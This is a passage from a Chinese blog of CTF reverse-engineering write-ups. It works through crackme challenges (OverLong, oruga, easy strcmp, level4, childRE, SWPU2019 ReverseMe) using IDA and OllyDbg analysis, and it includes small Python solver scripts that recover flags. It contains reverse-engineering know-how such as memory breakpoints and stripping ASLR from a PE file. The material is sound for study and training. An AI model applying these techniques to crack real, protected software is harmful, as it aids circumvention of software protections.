+ a2[<span class="hljs-number">2</span>]) ^ ((v3 &gt;&gt; <span class="hljs-number">9</span>) + a2[<span class="hljs-number">3</span>]) ^ <span class="hljs-number">0x10</span>;<br>        v3 -= (v4 + v5 + <span class="hljs-number">11</span>) ^ ((v4 &lt;&lt; <span class="hljs-number">6</span>) + a2[<span class="hljs-number">0</span>]) ^ ((v4 &gt;&gt; <span class="hljs-number">9</span>) + a2[<span class="hljs-number">1</span>]) ^ <span class="hljs-number">0x20</span>;<br>        v5 -= <span class="hljs-number">1166789954</span>;<br>    &#125;<br>    v[i]=v3; <br>    v[i+<span class="hljs-number">1</span>]=v4;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">3746099070</span>, <span class="hljs-number">550153460</span>, <span class="hljs-number">3774025685</span>, <span class="hljs-number">1548802262</span>, <span class="hljs-number">2652626477</span>, <span class="hljs-number">2230518816</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>]= &#123;<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-built_in">decrypt</span>(v,k);<br>    <span class="hljs-comment">// 注意windows小端序输出 </span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>    <span class="hljs-type">char</span> a3 = v[i] &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-type">char</span> a2 = v[i] &gt;&gt; <span class="hljs-number">8</span>;<br><span class="hljs-type">char</span> a1 = v[i];<span class="hljs-comment">//舍弃高位，保留低位 </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c%c%c&quot;</span>,a3,a2,a1);<br>    <span class="hljs-comment">//或者cout &lt;&lt; *((char*)&amp;v[i] + 2) &lt;&lt; *((char*)&amp;v[i] + 1) &lt;&lt;  * ((char*)&amp;v[i]);</span><br>    &#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="overlong"><a class="markdownIt-Anchor" href="#overlong"></a> OverLong</h2><h3 id="分析-5"><a class="markdownIt-Anchor" href="#分析-5"></a> 分析</h3><ul><li><p>无壳，直接分析</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303121932873.png" alt="image-20230312193202829" /></p><ul><li><p>这里 <code>MessageBoxA</code> 显示文本框</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">MessageBoxA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HWND   hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">  UINT   uType</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><ul><li><code>LPCTSTR</code><ul><li>要显示的消息。 如果字符串由多个行组成，则可以使用回车符和/或每行之间的换行符分隔这些行。</li></ul></li><li><code>LPCTSTR</code><ul><li>对话框标题。 如果此参数为 <strong>NULL</strong>，则默认标题为 <strong>Error</strong>。</li></ul></li></ul></li></ul></li><li><p>由此可知，这里输出了 <code>Text</code> 的内容，也就是 <code>v6</code> 的内容，而 <code>v6</code> 使用 <code>sub_401160</code> 进行了更改</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303121935826.png" alt="image-20230312193553796" /></p><ul><li>查看函数，循环了28次，而又由于改变的数据 <code>unk_402008</code> 的数据长度不止为28位，同时根据运行程序得到了28字节的字符串，料想需要对于全部数据进行处理，则在动调中改变 28 的值, 最后得到答案。</li></ul><table style="border:none;text-align:center;width:auto;margin: 0 auto;">  <tbody>  <tr>  <td style="padding: 6px"><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303121938309.png" ></td><td><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303121944927.png" ></td>  </tr>      <tr><td><strong>未修改之前</strong></td><td><strong>修改之后</strong></td></tr>  </tbody></table></li></ul><h2 id="oruga"><a class="markdownIt-Anchor" href="#oruga"></a> oruga</h2><h3 id="分析-6"><a class="markdownIt-Anchor" href="#分析-6"></a> 分析</h3><ul><li><p>无壳，直接分析</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303121953195.png" alt="image-20230312195358159" /></p></li><li><p>前面是判断前缀是否相同，关键函数是 <code>sub_78A</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303122017480.png" alt="image-20230312201735441" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303122018150.png" alt="image-20230312201807123" /></p></li><li><p>函数逻辑分内外两层循环，外循环确定方向，内循环位移。与常见迷宫题目不同的是，这里的位移是一直移动，直到碰到非0字符(由内循环实现)。这里内循环依据 <code>v4</code> 的值一直进行操作，直到尽头，而外循环中的<code>v2 -= v4</code>实际上是为了解决内循环中多余的一次位移而进行的操作。WMJE分别代表上下左右。</p></li><li><p>由dump出的数据，可以判断出路径(可以先用常规方向键走，之后再替换)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303122021310.png" alt="image-20230312202147279" /></p></li></ul><h2 id="easy-strcmp"><a class="markdownIt-Anchor" href="#easy-strcmp"></a> easy strcmp</h2><p>[buuoj-<a href="https://www.cnblogs.com/Hznuxxw/p/16989358.html">Zer0pts2020]easy strcmp</a></p><h3 id="分析-7"><a class="markdownIt-Anchor" href="#分析-7"></a> 分析</h3><ul><li><p>无壳，直接分析。但是直接看main函数没有看出来什么</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303130836500.png" alt="image-20230313083654457" /></p></li><li><p>查看 <code>init</code> 函数，这里有个 <code>funcs_889</code> 函数，跟入查看，调用了 <code>sub_795</code> 函数</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303130838948.png" alt="image-20230313083858918" /></p></li><li><p>这里出现了 <code>strcmp</code> ，怀疑之前的<code>strcmp</code> 有问题，查看其地址，发现是调用了 <code>off_201028</code> 地址函数，在这个函数中刚好看出调用了 <code>sub_6EA</code> 函数，深入查看。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303130843698.png" alt="image-20230313084354655" /></p></li><li><p>这里一个(char)为一组，之后减去一个字节对应长度的数值，最后得到 <code>main</code> 函数中比较的那个字符串。注意给的数据以小端序的形式存储，不过shift+e提取就是小端序。</p></li></ul><h3 id="exp-5"><a class="markdownIt-Anchor" href="#exp-5"></a> exp</h3><ul><li>这里字符串相加的大致实现是：将大数做成多个字节，将每个字节与对应的字符串相加(指相同字节位对齐相加，多者溢出)，这里溢出处理是关键。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x09</span>,<br>  <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x0B</span>,<br>  <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x3A</span>,<br>  <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>key = <span class="hljs-string">&#x27;zer0pts&#123;********CENSORED********&#125;&#x27;</span><br><br>f = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>  <span class="hljs-keyword">if</span> f != <span class="hljs-number">0</span>:<br>    tmp = enc[i] + <span class="hljs-built_in">ord</span>(key[i]) + f<br>    f = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">else</span>:<br>    tmp = enc[i] + <span class="hljs-built_in">ord</span>(key[i])<br>  <span class="hljs-keyword">if</span> tmp &gt; <span class="hljs-number">0xff</span>:<br>    f = <span class="hljs-number">1</span><br>  tmp &amp;= <span class="hljs-number">0xff</span><br>  flag += <span class="hljs-built_in">chr</span>(tmp)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="level4"><a class="markdownIt-Anchor" href="#level4"></a> level4</h2><h3 id="分析-8"><a class="markdownIt-Anchor" href="#分析-8"></a> 分析</h3><ul><li><p>直接IDA，查看伪代码</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303130859803.png" alt="image-20230313085904775" /></p></li><li><p>这里查看 <code>type1</code> 和 <code>type2</code></p></li></ul><table style="border:none;text-align:center;width:auto;margin: 0 auto;">  <tbody>  <tr>  <td style="padding: 6px"><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303130859242.png" ></td><td><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303130900138.png" ></td>  </tr>      <tr><td><strong>type1</strong></td><td><strong>type2</strong></td></tr>  </tbody></table><ul><li><p>可以发现这里为二叉树的中序遍历和后续遍历。那么根据这两个遍历，可以知道前序遍历的结果，也就是 <code>type3</code> 为前序遍历。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303130907542.png" alt="image-20230313090751513" /></p></li><li><p>运行截图，可以得到中序和后序遍历的结果</p></li></ul><h3 id="exp-6"><a class="markdownIt-Anchor" href="#exp-6"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ToPreOrder</span>(<span class="hljs-params">Postorder,Inorder</span>):<br>    length = <span class="hljs-built_in">len</span>(Postorder)<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    root = Postorder[length-<span class="hljs-number">1</span>] <span class="hljs-comment">#根节点　</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<span class="hljs-comment">#找到中序遍历中根节点的位序</span><br>        <span class="hljs-keyword">if</span> root == Inorder[i]:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(root,end=<span class="hljs-string">&quot;&quot;</span>)<br>    ToPreOrder(Postorder[<span class="hljs-number">0</span>:i],Inorder[<span class="hljs-number">0</span>:i]) <span class="hljs-comment">#递归，传入左子树的后序和中序遍历序列</span><br>    ToPreOrder(Postorder[i:length-<span class="hljs-number">1</span>],Inorder[i+<span class="hljs-number">1</span>:length])<span class="hljs-comment">#递归，传入右子树的后序和中序遍历序列</span><br>    <br>ToPreOrder(<span class="hljs-string">&quot;20f0Th&#123;2tsIS_icArE&#125;e7__w&quot;</span>,<span class="hljs-string">&quot;2f0t02T&#123;hcsiI_SwA__r7Ee&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="third_page"><a class="markdownIt-Anchor" href="#third_page"></a> Third_Page</h1><h2 id="2019红帽杯childre"><a class="markdownIt-Anchor" href="#2019红帽杯childre"></a> [2019红帽杯]childRE</h2><p>​<strong>Windows 内置函数的理解</strong></p><h3 id="分析-9"><a class="markdownIt-Anchor" href="#分析-9"></a> 分析</h3><ul><li>无壳，64位，直接IDA分析</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304072344923.png" alt="image-20230407234421853" /></p><ul><li>首先检测了输入长度，之后 <code>if语块</code> 没多关注，构造输入 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcde</code>，进行动调，查看v5发现将输入的顺序打乱为 <code>PQHRSIDTUJVWKEBXYLZaMFbcNdeOGCA</code></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304072346858.png" alt="image-20230407234656810" /></p><ul><li>之后从后往前看，发现 <code>a123456789Qwer</code>，<code>a46200860044218</code>，<code>a55565653255552</code> 有相应数据，直接爆破得到了 <code>outputString</code> 的最终值 <code>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</code></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304072348861.png" alt="image-20230407234800829" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">&quot;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#x27;,27h,&#x27;ASDFGHJKL:\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,.&quot;</span><br>f1 = <span class="hljs-string">&#x27;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&#x27;</span><br>f2 = <span class="hljs-string">&#x27;55565653255552225565565555243466334653663544426565555525555222&#x27;</span><br><br>message = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(key[j % <span class="hljs-number">23</span>]) == <span class="hljs-built_in">ord</span>(f1[i]) <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(key[j//<span class="hljs-number">23</span>]) == <span class="hljs-built_in">ord</span>(f2[i]):<br>            message +=<span class="hljs-built_in">chr</span>(j)<br><span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure><ul><li>由上文在动调中，执行此函数之前，<code>v5</code> 和 <code>name</code> 占用同一块空间，都是 <code>PQHRSIDTUJVWKEBXYLZaMFbcNdeOGCA</code> ，可以发现 if语块负责打乱输入的字符顺序。之后执行此函数后，打乱的结果传递给了 <code>outputString</code>，可以推测出 <code>outputString  = private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</code></li><li>综合目前的信息，可以知道函数 <code>UnDecorateSymbolName(v5, outputString, 0x100u, 0);</code> 获得一个打乱的输出 <code>v5</code>，经过函数的性质，转化为了 <code>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</code></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304081553288.png" alt="image-20230408155333208" /></p><h3 id="关键函数"><a class="markdownIt-Anchor" href="#关键函数"></a> 关键函数</h3><ul><li><p>现在问题就是明白 <code>UnDecorateSymbolName(v5, outputString, 0x100u, 0);</code> 函数的具体含义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">DWORD IMAGEAPI <span class="hljs-title">UnDecorateSymbolName</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  PCSTR name,</span></span><br><span class="hljs-params"><span class="hljs-function">  [out] PSTR  outputString,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  DWORD maxStringLength,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  DWORD flags</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><ul><li><code>[in] name</code> 修饰的 C++ 符号名称。 此名称可由名称的第一个字符标识，该名称始终是问号 (？)</li><li><code>[out] outputString</code> 指向接收未编码名称的字符串缓冲区的指针</li><li><code>[in] maxStringLength</code> <em>UnDecoratedName</em> 缓冲区的大小(以字符为单位)</li><li><code>[in] flags</code> 修饰名称如何取消编码的选项。 此参数为 0x0000 标识医用完全消除记录</li></ul></li></ul><p>*<em>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char <em>)</em></em></p><ul><li>参考资料1</li></ul><blockquote><p>目前根据函数知道了第一个参数为输出地址，第二个参数是未修饰的名字，第三个参数为长度，第四个参数为0表示完全修饰</p></blockquote><ul><li>参考资料2</li></ul><blockquote><p><em>c++函数名的修饰更为复杂，提供的信息也更为丰富。</em><br /><em>无论 __cdecl，__fastcall还是__stdcall调用方式，函数修饰都是以一个“?”开始，后面紧跟函数的名字。再后面是参数表的开始标识和依照参数类型代号拼出的参数表。</em></p></blockquote><p><code>v5 = ?My_Aut0_PWN</code> - 函数修饰以“？”开始，后面跟随函数的名字</p><blockquote><p><em>对于C<ins>的类成员函数(其调用方式是thiscall)，函数的名字修饰与非成员的C</ins>函数稍有不同，首先就是在函数名字和参数表之间插入以“@”字符引导的类名。</em></p></blockquote><p><code>v5 = ?My_Aut0_PWN@ROPxx</code> - 类名是 <code>ROPxx</code></p><blockquote><p>其次是参数表的开始标识不同，</p><p><em>公有(public)成员函数的标识是“@@QAE”，</em></p><p><em>保护(protected)成员函数的标识是 “@@IAE”，</em></p><p><em>私有(private)成员函数的标识是“@@AAE”，</em></p><p><em>假设函数声明使用了constkeyword，则对应的标识应分别为“@@QBE”，“@@IBE”和“@@ABE”。</em></p></blockquote><p><code>v5 = ?My_Aut0_PWN@ROPxx@@AAE</code> - 私有成员(private)</p><blockquote><p><em>参数表的拼写代号如下：</em><br /><em>X–void</em><br /><em>D–char</em><br /><em>E–unsigned char</em><br /><em>F–short</em><br /><em>H–int</em><br /><em>I–unsigned int</em><br /><em>J–long</em><br /><em>K–unsigned long(DWORD)</em><br /><em>M–float</em><br /><em>N–double</em><br /><em>_N–bool</em><br /><em>U–struct</em><br /><em>…</em><br /><em>指针的方式有些特别。用PA表示指针，用PB表示const类型的指针。</em></p></blockquote><p><code>v5 = ?My_Aut0_PWN@R0Pxx@@AAEPAD</code> - 类名之后就是参数表，这个先加入函数返回值参数为 <code>char *</code></p><p><code>v5 = ?My_Aut0_PWN@R0Pxx@@AAEPADPAE</code> - 之后就是添加形参了，这里是 <code>unsigned char *</code></p><blockquote><p><em>参数表后以“@Z”标识整个名字的结束。假设该函数无参数，则以“Z”标识结束。</em></p></blockquote><p><code>v5 = ?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z</code> - 结尾标识</p><h3 id="exp-7"><a class="markdownIt-Anchor" href="#exp-7"></a> exp</h3><ul><li>得到了 <code>v5</code> 的值，可以根据前文字符的打乱顺序进行还原，之后进行md5加密</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>m = <span class="hljs-string">&#x27;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&#x27;</span><br>enc1 = <span class="hljs-string">&#x27;PQHRSIDTUJVWKEBXYLZaMFbcNdeOGCA&#x27;</span><br>enc2 = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcde&#x27;</span><br>c = [<span class="hljs-string">&#x27;0&#x27;</span>] * <span class="hljs-number">31</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc2)):<br>    c[i] = m[enc1.find(enc2[i])]<br>k = <span class="hljs-string">&#x27;&#x27;</span>.join(c)<br>obj = hashlib.md5(k.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-built_in">print</span>(obj.hexdigest())<br></code></pre></td></tr></table></figure><h2 id="swpu2019reverseme"><a class="markdownIt-Anchor" href="#swpu2019reverseme"></a> [SWPU2019]ReverseMe</h2><p>​<strong>内存访问断点的使用</strong></p><h3 id="分析-10"><a class="markdownIt-Anchor" href="#分析-10"></a> 分析</h3><ul><li>正常使用IDA分析</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304081909327.png" alt="image-20230408190950254" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304081910191.png" alt="image-20230408191010144" /></p><ul><li>从前后进行动调分析，最后得到 <code>sub_402350</code> 对输入的flag 进行操作，和 <code>v36</code> 等内置数据进行比较得到结果。这里 <code>sub_402350</code> 太过于复杂，搜索别人的学会了内存断点的方法。</li></ul><h3 id="内存断点"><a class="markdownIt-Anchor" href="#内存断点"></a> 内存断点</h3><h4 id="禁用aslr"><a class="markdownIt-Anchor" href="#禁用aslr"></a> 禁用ASLR</h4><blockquote><p>首先记得关闭ASLR，否则OD和IDA中基址就不太一样</p></blockquote><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304082000293.png" alt="image-20230408200039234" /></p><ul><li><p>微软从windows vista/windows server 2008(kernel version 6.0)开始采用ASLR技术，主要目的是为了防止缓冲区溢出。ASLR技术会使PE文件每次加载到内存的起始地址随机变化，并且进程的栈和堆的起始地址也会随机改变。这里只要PE头 DLL Charateristics 有 0x40 时，每次OD加载时的基址就不一样。去掉IMAGE_OPTIONAL_HEADER.DLLCharacteristics 的IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 可以禁用随机基址。</p></li><li><p>使用 <code>Study PE</code> 直接固定基址，之后另存为文件即可</p></li></ul><h4 id="od调试"><a class="markdownIt-Anchor" href="#od调试"></a> OD调试</h4><ul><li>根据上下文，找到了调用 <code>sub_402350</code> 之前的位置，并在内存窗口看到打乱顺序的input(一开始输入了32个 ‘1’)</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304082006374.png" alt="image-20230408200623320" /></p><ul><li>在内存窗口(红框)下 <code>内存访问断点</code>，然后 <code>F9</code> 执行，找到了函数中对于 input 地址的更改。发现这里使用 <code>ecx</code> 对数据进行了异或处理，之后又赋值到 <code>[ebx + eax - 0x4]</code> 的位置。<code>PS:F9 抵达断点位置时，这个时候[ebi + eax] 已经对 ecx进行了赋值操作，所以一开始的数据需要在内存窗口往上翻才能找到</code></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304082028713.png" alt="image-20230408202843658" /></p><ul><li>之后在内存新地址下 <code>内存访问断点</code> 。发现这里将 <code>eax</code> 和 <code>edx</code> 逐个进行比较，这里 <code>eax</code> 来自 ecx，如下内存窗口。而 <code>edx</code> 就是下内存访问断点的地方，就是数据存储的区域。这里也验证了IDA中最后对比的过程。</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304082034829.png" alt="image-20230408203403780" /></p><h3 id="exp-8"><a class="markdownIt-Anchor" href="#exp-8"></a> exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">ipt = <span class="hljs-string">&#x27;11111111111111111111111111111111&#x27;</span> <span class="hljs-comment"># len is 32</span><br>v10 = <span class="hljs-built_in">list</span>(ipt)<br>v35 = <span class="hljs-string">&#x27;SWPU_2019_CTF&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ipt)):<br>    v10[i] = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(v10[i]) ^ <span class="hljs-built_in">ord</span>(v35[i % <span class="hljs-built_in">len</span>(v35)]))<br><span class="hljs-built_in">print</span>(v10)<br><br>enc = [  <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x5A</span>,<br>  <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x16</span>,<br>  <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x6B</span>,<br>  <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x67</span>]<br><br>key = [<span class="hljs-number">0x86</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x19</span>,  <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xB0</span>,<br><span class="hljs-number">0x69</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x28</span><br>]<br>flag = [<span class="hljs-string">&#x27;0&#x27;</span>] * <span class="hljs-number">32</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    flag[i] = <span class="hljs-built_in">chr</span>(enc[i] ^ key[i] ^ <span class="hljs-built_in">ord</span>(v35[i % <span class="hljs-built_in">len</span>(v35)]))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))<br></code></pre></td></tr></table></figure><h2 id="npuctf2020你好sao啊"><a class="markdownIt-Anchor" href="#npuctf2020你好sao啊"></a> [NPUCTF2020]你好sao啊</h2><ul><li><p>查壳，一个无壳的64位程序</p></li><li><p>查看内部信息，这里可以观察对于输入的s进行了RxEncode的函数操作，之后把这个结果s1与本身赋值的s2进行对比，相同就是正确的flag了</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202309302051129.png" alt="image-20230930205151048" /></p></li><li><p>查看 RxEncode 